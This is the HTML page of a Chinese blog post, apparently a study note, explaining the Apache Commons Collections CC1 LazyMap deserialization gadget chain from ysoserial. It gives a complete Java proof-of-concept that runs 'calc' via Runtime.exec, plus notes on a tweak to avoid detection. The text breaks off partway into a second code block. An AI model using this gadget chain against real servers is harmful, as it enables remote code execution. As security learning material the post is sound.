@@ -1,0 +1,371 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>java安全-CC1进阶 | 十七.</title><meta name="author" content="chuanchuan"><meta name="copyright" content="chuanchuan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="java安全链中的CC1_plus，主要分析了官方ysoserial的LazyMap链，并且研究了jdk8u71版本后CC1失效的原因">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java安全-CC1进阶">
+<meta property="og:url" content="https://zc-18.github.io/2026/01/15/CC1_plus-chain/index.html">
+<meta property="og:site_name" content="十七.">
+<meta property="og:description" content="java安全链中的CC1_plus，主要分析了官方ysoserial的LazyMap链，并且研究了jdk8u71版本后CC1失效的原因">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/4.webp">
+<meta property="article:published_time" content="2026-01-15T10:00:00.000Z">
+<meta property="article:modified_time" content="2026-01-15T13:39:59.618Z">
+<meta property="article:author" content="chuanchuan">
+<meta property="article:tag" content="CC链">
+<meta property="article:tag" content="java安全">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/4.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "java安全-CC1进阶",
+  "url": "https://zc-18.github.io/2026/01/15/CC1_plus-chain/",
+  "image": "https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/4.webp",
+  "datePublished": "2026-01-15T10:00:00.000Z",
+  "dateModified": "2026-01-15T13:39:59.618Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "chuanchuan",
+      "url": "https://zc-18.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan1.png"><link rel="canonical" href="https://zc-18.github.io/2026/01/15/CC1_plus-chain/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3-b2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e6047011fc3df8f4b86d7847de988e6d";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+btf.addGlobalFn('pjaxComplete', () => {
+  _hmt.push(['_trackPageview',window.location.pathname])
+}, 'baidu_analytics')
+</script><link rel="stylesheet" href="/%3Clink%20rel=%22stylesheet%22%20href=%22https:/fonts.googleapis.com/css2?family=Poppins:wght@700&amp;family=Noto+Serif+SC:wght@700&amp;display=swap%22%3E" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":false,"highlightLang":false,"highlightHeightLimit":380,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'java安全-CC1进阶',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="gear-loader"><div class="gear-loader_overlay"></div><div class="gear-loader_cogs"><div class="gear-loader_cogs__top"><div class="gear-top_part"></div><div class="gear-top_part"></div><div class="gear-top_part"></div><div class="gear-top_hole"></div></div><div class="gear-loader_cogs__left"><div class="gear-left_part"></div><div class="gear-left_part"></div><div class="gear-left_part"></div><div class="gear-left_hole"></div></div><div class="gear-loader_cogs__bottom"><div class="gear-bottom_part"></div><div class="gear-bottom_part"></div><div class="gear-bottom_part"></div><div class="gear-bottom_hole"></div></div></div></div></div><script>(() => {
+  const box = document.getElementById('loading-box')
+  const body = document.body
+
+  let start = Date.now() // 动画开始时间
+
+  const end = () => {
+    const elapsed = Date.now() - start
+    const minDelay = Math.max(0, 1000 - elapsed) // 保证最少 1 秒
+
+    setTimeout(() => {
+      body.style.overflow = ''
+      box.classList.add('loaded')
+    }, minDelay)
+  }
+
+  // ===== 最多 3 秒强制结束 =====
+  const maxTimer = setTimeout(end, 3000)
+
+  // 页面加载完结束
+  if (document.readyState === 'complete') {
+    clearTimeout(maxTimer)
+    end()
+  } else {
+    window.addEventListener('load', () => {
+      clearTimeout(maxTimer)
+      end()
+    })
+  }
+
+  // ===== PJAX 支持 =====
+  if (true) {
+    btf.addGlobalFn(
+      'pjaxSend',
+      () => {
+        body.style.overflow = 'hidden'
+        box.classList.remove('loaded')
+        start = Date.now() // 重新计时
+        clearTimeout(maxTimer)
+        setTimeout(end, 3000) // PJAX 同样最多 3 秒
+      },
+      'gear_init'
+    )
+    btf.addGlobalFn('pjaxComplete', () => {
+      clearTimeout(maxTimer)
+      end()
+    }, 'gear_end')
+  }
+})()</script><div class="bg-animation" id="web_bg" style="background-color: #efefef;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan2.jpg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/4.webp);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan1.png" alt="Logo"><span class="site-name">十七.</span></a><a class="nav-page-title" href="/"><span class="site-name">java安全-CC1进阶</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">java安全-CC1进阶</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-01-15T10:00:00.000Z" title="发表于 2026-01-15 18:00:00">2026-01-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-15T13:39:59.618Z" title="更新于 2026-01-15 21:39:59">2026-01-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CC%E9%93%BE/">CC链</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="java安全-CC1进阶"><a href="#java安全-CC1进阶" class="headerlink" title="java安全-CC1进阶"></a>java安全-CC1进阶</h1><h2 id="一、官方CC1"><a href="#一、官方CC1" class="headerlink" title="一、官方CC1"></a>一、官方CC1</h2><p><code>ysoserial</code>官方链为</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">		ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">			AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">				Map(Proxy).entrySet()</span></span><br><span class="line"><span class="comment">					AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment">						LazyMap.get()</span></span><br><span class="line"><span class="comment">							ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">								ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">								InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">									Method.invoke()</span></span><br><span class="line"><span class="comment">										Class.getMethod()</span></span><br><span class="line"><span class="comment">								InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">									Method.invoke()</span></span><br><span class="line"><span class="comment">										Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">								InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">									Method.invoke()</span></span><br><span class="line"><span class="comment">										Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Requires:</span></span><br><span class="line"><span class="comment">		commons-collections</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="二、主要逻辑"><a href="#二、主要逻辑" class="headerlink" title="二、主要逻辑"></a>二、主要逻辑</h2><p>官方<code>CC1</code>没有使用我们一开始的类，而是用到了<code>LazyMap.java</code>这个类文件</p>
+<ul>
+<li><strong>入口类</strong><code>readObject</code>类没有变，依旧是<code>sun.reflect.annotation.AnnotationInvocationHandler</code>这个类下的<code>readObject</code>方法</li>
+<li><strong>最终危险调用结束</strong>也没有改变，依旧是<code>ChainedTransformer.transform()</code>这个链式方法执行命令</li>
+</ul>
+<p>改变的是中间逻辑<code>lazyMap的调用</code></p>
+<p><strong>具体过程如下（危险到入口）</strong></p>
+<h3 id="1-ChainedTransformer-transform方法的调用"><a href="#1-ChainedTransformer-transform方法的调用" class="headerlink" title="1.ChainedTransformer#transform方法的调用"></a>1.<code>ChainedTransformer#transform</code>方法的调用</h3><p>这里，官方选取了<code>org/apache/commons/collections/map/LazyMap.java</code>这个类中的<code>get</code>方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601102202286.png" alt="image-20260110220224169"></p>
+<p><strong>这个方法的条件一般都是容易满足，只要没有key对应的value，如果满足这个条件就会接着调用 factory 的 transform 方法，而这个transform类是可控的</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601102205478.png" alt="image-20260110220548417"></p>
+<p>利用此方法创建LazyMap对象时，传入第二个参数便可以控制为<strong>new ChainedTransformer(chuan) <strong>这个</strong>恶意类</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chuan));</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-lazyMap-get方法的调用"><a href="#2-lazyMap-get方法的调用" class="headerlink" title="2.lazyMap#get方法的调用"></a>2.<code>lazyMap#get</code>方法的调用</h3><p>通过追溯，找到了<code>sun/reflect/annotation/AnnotationInvocationHandler.java</code>类下<code>invoke</code>方法会<strong>调用传入类（可控）的get 方法</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601102213836.png" alt="image-20260110221347588"></p>
+<p><strong>这里我们通过反射构造 sun.reflect.annotation.AnnotationInvocationHandler 类时，构造器传第二个参数为 lazyMap 对象即可</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-AnnotationInvocationHandler-invoke方法的调用"><a href="#3-AnnotationInvocationHandler-invoke方法的调用" class="headerlink" title="3.AnnotationInvocationHandler#invoke方法的调用"></a>3.<code>AnnotationInvocationHandler#invoke</code>方法的调用</h3><p>注意到此类实现了<code>InvocationHandler</code>接口，于是可以作为动态代理时，<strong>处理被代理对象的类</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601102218403.png" alt="image-20260110221801296"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);</span><br></pre></td></tr></table></figure>
+
+<p><strong>我们在调用 lazyMap 中的方法时，便会先调用 InvocationHandler 中的逻辑，也就会触发 invoke 方法中的 get 方法</strong></p>
+<p><strong>具体逻辑</strong></p>
+<ul>
+<li><p><strong>创建恶意Map集合</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chuan));</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>创建代理利用时的重写 invoke 方法的继承 InvocationHandler 的类</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br></pre></td></tr></table></figure>
+
+<p>这个与我们之前创建代理类时相同，不同的是我们<strong>不需要</strong>手动创建，这里直接使用<code>AnnotationInvocationHandler#invoke</code>类直接作为创建代理对象时的<strong>第三个参数也就是拦截器</strong></p>
+</li>
+<li><p><strong>创建代理类</strong></p>
+<p>这里我们使用<code>lazyMap</code>的类加载器作为第一个参数，因为我们要代理它嘛，实现的接口为 Map ，最终第三个参数为处理类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>代理触发点</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601111653024.png" alt="image-20260111165332836"></p>
+<p><strong>AnnotationInvocationHandler 类在反序列化时，会调用 readObject 方法，进而调用 memberValues.entrySet() 方法，随后变走到了动态代理里面，因此我们构造使得 memberValues 为mapProxy 对象</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj2</span> <span class="operator">=</span> constructor.newInstance(Override.class,mapProxy);</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>由此，链式调用结束，实现恶意类的调用</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601111658894.png" alt="image-20260111165819741" style="zoom:40%;" />
+
+<h2 id="三、poc"><a href="#三、poc" class="headerlink" title="三、poc"></a>三、poc</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chaun0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(r);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chuan1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chuan2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">Transformer chuan3= <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">Transformer[] chuan = &#123;chaun0,chuan1,chuan2,chuan3&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chuan));</span><br><span class="line"></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj2</span> <span class="operator">=</span> constructor.newInstance(Override.class,mapProxy);</span><br><span class="line"></span><br><span class="line">serialize(obj2);</span><br><span class="line">unserialize();</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-链路回顾"><a href="#1-链路回顾" class="headerlink" title="1.链路回顾"></a>1.<strong>链路回顾</strong></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">AnnotationInvocationHandler#</span><span class="language-bash">readObject()</span></span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">memberValues.entrySet()		1.memberValues=mapProxy</span></span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">mapProxy#entrySet()</span></span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">AnnotationInvocationHandler#invoke()</span></span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">memberValues.get(member)-&gt;mapProxy#get(member)</span></span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">factory#transform(key)     2.factory=ChainedTransformer(chuan)</span></span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">ChainedTransformer(chuan)#transform(key)</span></span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">InvokerTransformer#transform()</span></span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">Runtime.<span class="built_in">exec</span>()</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-额外"><a href="#2-额外" class="headerlink" title="2.额外"></a>2.<strong>额外</strong></h3><ul>
+<li><p><strong>官方在最后才修改了 ChainedTransformer(chuan)#transform(key) 中的 chuan 参数，防止，在序列化之前调用Map的某些方法导致先行执行命令，造成干扰</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601111725823.png" alt="image-20260111172507620"></p>
+</li>
+<li><p>**官方在chain链的最后加入了一个 new ConstantTransformer(1) } **</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601111745649.png" alt="image-20260111174553580"></p>
+<p><strong>这么做的目的，理论上是为了防止恶意类被检测到</strong></p>
+<ul>
+<li><p>没做之前异常信息为</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.ClassCastException: java.lang.ProcessImpl cannot be cast to java.util.Set</span><br></pre></td></tr></table></figure>
+
+<p>这里有一个<strong>java.lang</strong></p>
+</li>
+<li><p>添加之后</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601111748386.png" alt="image-20260111174833251"></p>
+<p><strong>变为了 Integer</strong></p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="3-完美"><a href="#3-完美" class="headerlink" title="3.完美"></a>3.完美</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span 